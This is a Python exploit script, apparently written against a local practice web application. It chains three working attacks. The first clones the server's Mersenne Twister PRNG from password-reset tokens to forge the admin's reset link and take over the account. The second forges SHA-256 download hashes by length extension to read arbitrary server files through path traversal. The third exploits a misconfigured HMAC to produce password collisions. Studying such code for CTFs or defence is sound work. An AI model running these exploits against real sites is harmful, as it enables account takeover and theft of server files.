import re,os
import poplib 
import requests
import base64
import random 
import time
import hashlib
from bs4 import BeautifulSoup
from tqdm import tqdm
from urllib.parse import quote_plus, urljoin, urlparse, quote, unquote, unquote_to_bytes, quote_from_bytes
from mt19937_attack import ReverseOutput,MT19937
from sha256 import SHA256
from tool_enum_sha256_vuln_random import go

pre_number_mess = 0
firstname,lastname = 'jerermy','renner'
ip_mail,port_mail,username_mail,password_mail,SSL = "pop.gmail.com",995,"[DETACT]","[DETACT]",True

proxies={"http": "http://127.0.0.1:8080", "https": "https://127.0.0.1:8080"}
headers = {
'Connection': 'keep-alive',
'Accept-language': 'en-US,en;q=0.9,vi;q=0.8',
'User-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
			  'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 '
			  'Safari/537.36'
}

# https://serverfault.com/questions/66347/why-is-the-response-on-localhost-so-slow
# ip,port = 'localhost',9000
ip,port = '127.0.0.1',9000
base = f'http://{ip}:{port}'
url = {
	'base':base,
	'register':f"{base}/register",
	'login':f"{base}/login",
	'profile':f"{base}/profile",
	'logout':f"{base}/logout",
	'forget':f"{base}/forget",
	'reset':f"{base}/reset",
	'download':f"{base}/download",
}

def get_newest_mail():
	# global pre_number_mess
	M = poplib.POP3_SSL(host=ip_mail,port=port_mail) if SSL else poplib.POP3(host=ip_mail,port=port_mail) 
	M.user(username_mail)
	M.pass_(password_mail)
	number_mess = len(M.list()[1])
	## sometime server mail loss data when not upload to mail service 
	# while number_mess==pre_number_mess:number_mess = len(M.list()[1]);time.sleep(.5)
	# pre_number_mess = number_mess
	# print(pre_number_mess)
	return b'\n'.join(M.retr(number_mess)[1])

rx_boundarymail = re.compile(b'Content-Type: multipart/alternative; boundary="(.*)"\n')
def extract_token_mail(data):
	# boundary = rx_boundarymail.search(data).group(1).decode()
	# print(boundary)
	# regex_str = f'({boundary})(.+)((?:\n.+)+)(--{boundary})'.encode()
	# rx_content_mail = re.compile(regex_str,re.MULTILINE)
	# ret = rx_content_mail.findall(data)
	rx_token = re.compile(b'http://localhost:9000/reset/(.*)/')
	tmp = rx_token.search(data)
	ret = tmp.group(1) if tmp else b''
	return ret

def extract_csrf(resp):
	soup = BeautifulSoup(resp.text,'html.parser')
	token = soup.find('input', {'name':'csrf_token'})['value']
	return token

def enumurate_link_download(resp):
	soup = BeautifulSoup(resp.text,'html.parser')
	list_link = soup.findAll('a',{'class':'is-link'})
	return [url['base']+link['href'] for link in list_link]

def get_file_valid_hash(hacker,list_file_hash):
	return [file_hash for file_hash in list_file_hash if hacker.download_file(*file_hash)[0] ]

def find_new_base(hacker,base_file,hash_file):
	base_file = base64.b64decode(base_file).decode("Latin1")
	hash_ = bytes.fromhex(hash_file)
	state = [int.from_bytes(hash_[i:i+4],'big') for i in range(0,len(hash_),4)]
	sha256_algo = SHA256()
	sha256_algo.h = state
	next_block_mess = f'/../{base_file}'
	base_file = base_file.encode("Latin1")
	new_hash = sha256_algo.sha256(next_block_mess.encode(),force_length_mess=len(next_block_mess)+len(sha256_algo.padding(b''))).hex()
	'''
	junk_length = 32
	prefix_junk = bytes(junk_length)
	# new_base = SHA256().padding(prefix_junk+base_file)[junk_length:]
	new_file_name = (new_base+next_block_mess.encode())
	'''
	# if hacker.download_file(new_file_name,new_hash)[0]:
		# return new_base.decode("Latin1")
	for junk_length in tqdm(range(1<<32)):
		prefix_junk = bytes(junk_length)
		new_base = SHA256().padding(prefix_junk+base_file)[junk_length:]
		new_file_name = (new_base+next_block_mess.encode())
		if hacker.download_file(base64.b64encode(new_file_name),new_hash)[0]:
			return new_base
	
	print("Failed")
	return ''
	
def gen_new_list_hash(hacker,file_hash_valid,list_link_):
	base_file,hash_file = file_hash_valid[0]
	set_valid_file = set(file[0] for file in file_hash_valid)
	new_base = find_new_base(hacker,base_file,hash_file)#;input()
	print("[+] Found new base:",new_base)
	hash_ = bytes.fromhex(hash_file)
	state = [int.from_bytes(hash_[i:i+4],'big') for i in range(0,len(hash_),4)]
	
	for file_,_ in list_link_:
		# print(file_)
		if file_ in set_valid_file: continue
		file = base64.b64decode(file_).decode("Latin1")
		sha256_algo = SHA256()
		sha256_algo.h = state
		next_block_mess = f'/../{file}'
		new_hash = sha256_algo.sha256(next_block_mess.encode(),force_length_mess=len(next_block_mess)+len(sha256_algo.padding(b''))).hex()
		tmp = base64.b64encode(new_base+next_block_mess.encode())
		# print(tmp,new_hash)
		if hacker.download_file(tmp,new_hash)[0]:
			file_hash_valid.append(( tmp,new_hash))
		else : 
			print("[-] Error happen")
	return file_hash_valid

def random_email():
	alphabet = 'qwertyuioasdghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'
	part1 = ''.join(random.choice(alphabet) for _ in range(6))
	part2 = ''.join(random.choice(alphabet) for _ in range(4))
	part3 = ''.join(random.choice(alphabet) for _ in range(4))
	part4 = ''.join(random.choice(alphabet) for _ in range(3))
	return f"{part1}.{part2}@{part3}.{part4}"

class User:
	def __init__(self,mail,username,password):
		self.email = mail
		self.username = username
		self.password = password
		self.requests_session = requests.session()
	
	def register_acc(self):
		resp = self.requests_session.request("GET",url['register'],headers=headers)
		token = extract_csrf(resp)
		resp = self.requests_session.request("POST",url['register'],data={'email':self.email,'username':self.username,'password':self.password,'password_again':self.password,'submit:':'Register','csrf_token':token},headers=headers)
		return False if resp.url == url['register'] else True
		# print(resp.text)
		# self.login_acc()
		
	def login_acc(self):
		resp = self.requests_session.request("GET",url['login'],headers=headers)
		token = extract_csrf(resp)
		resp = self.requests_session.request("POST",url['login'],data={'username':self.email,'password':self.password,'submit:':'Login','csrf_token':token},headers=headers)
		return False if resp.url == url['login'] else True
		# print(resp.text)
	
	def logout_acc(self):
		resp = self.requests_session.request("GET",url['logout'],headers=headers)
	
	def get_reset_password_token(self):
		resp = self.requests_session.request("GET",url['forget'],headers=headers)
		token = extract_csrf(resp)
		resp = self.requests_session.request("POST",url['forget'],data={'email':self.email,'csrf_token':token},headers=headers)
		if 'Check your email account' not in resp.text:print("[-] Get Token Failed");return b''
		mail = get_newest_mail()
		return extract_token_mail(mail)
	
	def get_list_download_file(self):
		## only run after login 
		resp = self.requests_session.request("GET",url['download'],headers=headers)
		return enumurate_link_download(resp)
	
	def download_file(self,file,hash_):
		resp = self.requests_session.request("GET",url['download'],params={'file':file,'hash':hash_},headers=headers)#,proxies=proxies)
		# print(resp.url)
		return (False,'') if b'er">\n\t\t\tHash not' in resp.content else (True,resp.content)
	
	def __repr__(self):
		data = {
			'mail':self.email,
			'username':self.username,
			'password':self.password
		}
		return str(data)
	
def clone_prng_reset_token(hacker):
	print("[?] Clone prng")
	clone_prng,mt_internal_state = MT19937(0,_32bits=True),[]
	reverse = ReverseOutput(clone_prng=clone_prng,_32bits=True)
	bits = 32
	token = int.from_bytes(bytes.fromhex(hacker.get_reset_password_token().decode()),'big')
	# while mt_internal_state!=clone_prng.N:
	for _ in tqdm(range(clone_prng.N)):
		while not token: token = int.from_bytes(bytes.fromhex(hacker.get_reset_password_token().decode()),'big')
		state=token%(1<<bits)
		mt_internal_state.append(reverse.untemper(state))
		token>>=bits
	clone_prng.mt = mt_internal_state
	while token:
		assert clone_prng.extract_number()==token%(1<<bits) # sync prng to server 
		token>>=bits
	return clone_prng

## get info of admin 
def get_admin_username():
	resp = requests.request("GET",url['base'],headers=headers)
	rx_email = re.compile(r'''[a-zA-Z0-9._%+-:]+@[a-zA-Z0-9.-]+\.[a-zA-Z]+''')
	mail = rx_email.findall(resp.text,re.VERBOSE)[0]
	username = mail.split('@')[0]
	return {"mail":mail,'username':username}

def trigger_admin_reset_password(admin_username_mail):
	requests_session = requests.session()
	resp = requests_session.request("GET",url['forget'],headers=headers)
	token = extract_csrf(resp)
	resp = requests_session.request("POST",url['forget'],data={'submit':'Get Token Link','email':admin_username_mail['mail'],'csrf_token':token},headers=headers)
	return True if 'Check your email account' in resp.text else False

def resetpassword_admin(admin_username_mail,clone_prng):
	success = False
	requests_session = requests.session()
	new_password = ''.join(random.choice("ABCD") for _ in range(10))
	token_craft = b''
	for _ in range(512//32):token_craft = clone_prng.extract_number().to_bytes(4,'big') + token_craft
	url_resetpassword = f'{url["reset"]}/{token_craft.hex()}/'
	print("[?] Reset admin password link",url_resetpassword)
	resp = requests_session.request("GET",url_resetpassword,headers=headers)
	if 'Token not validate' in resp.text or 'Token expire' in resp.text:
		print("[-] Admin Password reset failed")
		return success,admin_username_mail
		
	token = extract_csrf(resp)
	resp = requests_session.request("POST",url_resetpassword,data={'password':new_password,'submit':'Reset','csrf_token':token},headers=headers)
	if 'Password change successful' in resp.text:
		print("[+] Admin Password reset Success")
		admin_username_mail['password']=new_password
		success = True
	else:
		print("[-] Admin Password reset failed")
	return success,admin_username_mail
	
def attack1(hacker,admin_username_mail):
	'''
	Vector attack 1:
	Account takeover via guessing the password reset token by 
	guessing the generated algorithm
	'''
	print("[+] Attack phase")
	if hacker.register_acc():
		print("[+] Register account success") 
	else:
		if hacker.login_acc():
			print("[+] Account already exist") 
			hacker.logout_acc()
		else :
			print("[-] Register Failed ")
			return 

	clone_prng = clone_prng_reset_token(hacker)
	if trigger_admin_reset_password(admin_username_mail):
		print("[+] Trigger feature generate Token resetpassword Admin")  
	else:
		print("[-] Trigger feature generate Token reset Token Admin");
		return 
	success,admin_username_mail = resetpassword_admin(admin_username_mail,clone_prng)
	if success:
		print("[+] Admin account take over success")
		print(admin_username_mail)
	else:
		print("[-] Mission Failed")
		return 

def attack2(hacker):
	'''
	Vector attack 2:
	download abitarity file from server via bypass hash authentication 
	with hash length extension attack
	'''
	rx_filename_hash = re.compile('file=(.*)&hash=(.*)')
	if hacker.register_acc():
		print("[+] Register account success") 
		hacker.login_acc()
	else:
		if hacker.login_acc():
			print("[+] Account already exist") 
			# hacker.logout_acc()
		else :
			print("[-] Register Failed ")
			exit(0)
	list_link = hacker.get_list_download_file()
	list_link_ = [rx_filename_hash.findall(link)[0] for link in list_link]
	file_hash_valid = get_file_valid_hash(hacker,list_link_)
	list_link_.append((base64.b64encode(b'/../app.py'),''))
	file_hash_valid = gen_new_list_hash(hacker,file_hash_valid,list_link_)
	result = {os.path.normpath(base64.b64decode(file).decode("Latin1")):f"{url['download']}?file={quote_plus(file)}&hash={hash_}" for file,hash_ in file_hash_valid}
	print(result)


def gen_hash_chain():
	alphabet = bytes(i for i in range(128))
	while True:
		password = bytes(random.choice(alphabet) for _ in range(65))
		tmp = hashlib.sha256(password).digest()
		if tmp.endswith(b'\0'):# and all(c <128 for c in tmp):
			return password

def attack3(hacker):
	'''
	Vector attack 3:
	multiple chain block in misconfig HMAC leak to downgrade collision 
	resistant 
	# But in this case. This exploit is not critical in this scenario
	'''
	# password1 = gen_hash_chain()#go(None)
	password1 = go(None)
	mail1 = random_email()
	user1 = User(mail1,mail1,password1)
	user1.register_acc()
	
	password2 = SHA256().sha256(password1).rstrip(b'\x00')
	mail2 = random_email()
	user2 = User(mail2,mail2,password2)
	user2.register_acc()
	
	password3 = password2+b'\x00'
	mail3 = random_email()
	user3 = User(mail3,mail3,password3)
	user3.register_acc()
	
	for user in [user1,user2,user3]:print(user)
	
	
if __name__=='__main__':
	
	print("[+] Recon phase")
	admin_username_mail = get_admin_username()
	print(admin_username_mail);
	hacker = User(username_mail,username_mail,username_mail)
	attack1(hacker,admin_username_mail)
	attack2(hacker)
	attack3(hacker)
	
	
	# requests_session = requests.session()
	'''
	username_mail_ = +username_mail
	resp = requests_session.request("GET",url['register'],headers=headers)
	token = extract_csrf(resp)
	resp = requests_session.request("POST",url['register'],data={'email':username_mail_,'username':username_mail_,'password':username_mail_,'password_again':username_mail_,'submit:':'Register','csrf_token':token},headers=headers,proxies=proxies)
	print(resp.text)
	'''
	